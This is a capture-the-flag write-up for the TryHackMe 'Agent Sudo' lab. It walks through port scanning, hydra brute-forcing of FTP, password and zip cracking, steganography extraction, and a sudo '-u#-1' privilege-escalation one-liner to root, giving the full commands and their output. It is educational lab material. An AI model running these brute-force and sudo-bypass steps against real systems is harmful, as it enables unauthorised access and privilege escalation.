---
title: "TryHackMe - Agent Sudo"
categories:
  - TryHackMe
tags:
  - linux
  - writeup
  - tryhackme
  - hacking
  - bruteforce
  - crack
---
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

## Enumerate
First, i started `rustscan` with `aggressive` mode.
```bash
$ rustscan -a 10.10.195.160 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.195.160:21
Open 10.10.195.160:22
Open 10.10.195.160:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-12 22:54 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Initiating Ping Scan at 22:54
Scanning 10.10.195.160 [2 ports]
Completed Ping Scan at 22:54, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:54
Completed Parallel DNS resolution of 1 host. at 22:54, 13.02s elapsed
DNS resolution of 1 IPs took 13.02s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 22:54
Scanning 10.10.195.160 [3 ports]
Discovered open port 22/tcp on 10.10.195.160
Discovered open port 80/tcp on 10.10.195.160
Discovered open port 21/tcp on 10.10.195.160
Completed Connect Scan at 22:54, 0.23s elapsed (3 total ports)
Initiating Service scan at 22:54
Scanning 3 services on 10.10.195.160
Completed Service scan at 22:55, 6.47s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.195.160.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:55
Completed NSE at 22:55, 6.22s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:55
Completed NSE at 22:55, 1.34s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:55
Completed NSE at 22:55, 0.00s elapsed
Nmap scan report for 10.10.195.160
Host is up, received syn-ack (0.20s latency).
Scanned at 2021-01-12 22:54:42 EST for 28s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There is **3 ports** open, it's ftp, ssh, and http. Let's visit the website at port 80.
<a href="/assets/images/tryhackme/agent-sudo/1.png"><img src="/assets/images/tryhackme/agent-sudo/1.png"></a>

It said if we use our own **codename** user-agent, we can access the site. Let's use burp-suite to bruteforce the right **codename**. Intercept the request and send it to intruder.
<a href="/assets/images/tryhackme/agent-sudo/2.png"><img src="/assets/images/tryhackme/agent-sudo/2.png"></a>

Set the payload to A-Z.
<a href="/assets/images/tryhackme/agent-sudo/3.png"><img src="/assets/images/tryhackme/agent-sudo/3.png"></a>

Start the Intruder.
<a href="/assets/images/tryhackme/agent-sudo/4.png"><img src="/assets/images/tryhackme/agent-sudo/4.png"></a>

It's agent C, let's see the response.
<a href="/assets/images/tryhackme/agent-sudo/5.png"><img src="/assets/images/tryhackme/agent-sudo/5.png"></a>

It said that our password (`chris`) is weak. So i think we can bruteforce the password later on.

## Hash cracking and brute-force
Since FTP port is open, let's bruteforce the ftp first.
```bash
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.195.160 -t 4 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-12 23:17:49
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://10.10.195.160:21/
[STATUS] 62.00 tries/min, 62 tries in 00:01h, 14344337 to do in 3856:01h, 4 active
[STATUS] 61.33 tries/min, 184 tries in 00:03h, 14344215 to do in 3897:54h, 4 active
[21][ftp] host: 10.10.195.160   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-12 23:21:54
```

We got the password, let's see what's inside the FTP.
```bash
$ ftp 10.10.195.160
Connected to 10.10.195.160.
220 (vsFTPd 3.0.3)
Name (10.10.195.160:kali): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget To_agentJ.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (1.4677 MB/s)
mget cute-alien.jpg? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.38 secs (84.3090 kB/s)
mget cutie.png? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.39 secs (87.7628 kB/s)
```

- To_agentJ.txt:
    ```
    Dear agent J,

    All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

    From,
    Agent C
    ```
- cutie.png and cute-alien.jpg:<br>
    <a href="/assets/images/tryhackme/agent-sudo/6.png"><img src="/assets/images/tryhackme/agent-sudo/6.png"></a>

It said the password is stored in one of the `fake` picture, let's figure it out.
```bash
$ binwalk cute-alien.jpg               

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

                                                                                                              
┌──(kali㉿kali)-[~]
└─$ binwalk cutie.png     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

The fake one is the `cutie.png`, let's extract what's inside.
```bash
$ foremost cutie.png 
Processing: cutie.png
|foundat=To_agentR.txt�
*|
```

Open the `.zip` file.<br>
<a href="/assets/images/tryhackme/agent-sudo/7.png"><img src="/assets/images/tryhackme/agent-sudo/7.png"></a>

We need the password. Let's bruteforce it first, maybe we can get the password.
```bash
$ zip2john 00000067.zip > hash
ver 81.9 00000067.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
                                                                                                              
┌──(kali㉿kali)-[~/output/zip]
└─$ john -wordlist=/usr/share/wordlists/rockyou.txt hash        
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (00000067.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2021-01-12 23:46) 2.777g/s 68266p/s 68266c/s 68266C/s sweetgurl..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got the password, let's see what's inside. To_agentR.txt file:
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

It's base64 encoded. Let's decode it.
```bash
$ echo "QXJlYTUx" | base64 -d                                                                           1 ⨯
Area51 
```

We got another password, i think it's used in anothe photo, let's try it.
```bash
$ steghide extract -sf cute-alien.jpg                                                                   1 ⨯
Enter passphrase: 
wrote extracted data to "message.txt".
```

- message.txt:
    ```
    Hi james,

    Glad you find this message. Your login password is hackerrules!

    Don't ask me why the password look cheesy, ask agent R who set this password for you.

    Your buddy,
    chris
    ```

We got credential for SSH connection, lets go!

## Capture the user flag
SSH with credential `james:hackerrules!`.
```bash
$ ssh james@10.10.195.160
james@10.10.195.160's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 13 04:58:44 UTC 2021

  System load:  0.0               Processes:           98
  Usage of /:   40.0% of 9.78GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 10.10.195.160
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$
```

user_flag.txt:
```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
REDACTED
```

There is an image there, let's download it to our local machine.
```bash
 scp james@10.10.195.160:Alien_autospy.jpg .                                                           1 ⨯
james@10.10.195.160's password: 
Alien_autospy.jpg                                                           100%   41KB  54.0KB/s   00:00    
```

- Alien_autospy.jpg:
    <a href="/assets/images/tryhackme/agent-sudo/8.png"><img src="/assets/images/tryhackme/agent-sudo/8.png"></a>

Let's search it on Google to see the incident.
<a href="/assets/images/tryhackme/agent-sudo/10.png"><img src="/assets/images/tryhackme/agent-sudo/10.png"></a>

<a href="/assets/images/tryhackme/agent-sudo/11.png"><img src="/assets/images/tryhackme/agent-sudo/11.png"></a>

It's a roswell alien autopsy incident.

## Privilege escalation
Let's check sudo privileges first.
```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

We can run `bash` but as non-root. Let's search this behaviour and maybe we find some CVE.
<a href="/assets/images/tryhackme/agent-sudo/12.png"><img src="/assets/images/tryhackme/agent-sudo/12.png"></a>

The CVE:
<a href="/assets/images/tryhackme/agent-sudo/13.png"><img src="/assets/images/tryhackme/agent-sudo/13.png"></a>

Let's use the exploit.
```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# 
```

Root.txt:
```bash
root@agent-sudo:~# cat /root/root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
REDACTED

By,
DesKel a.k.a Agent R
```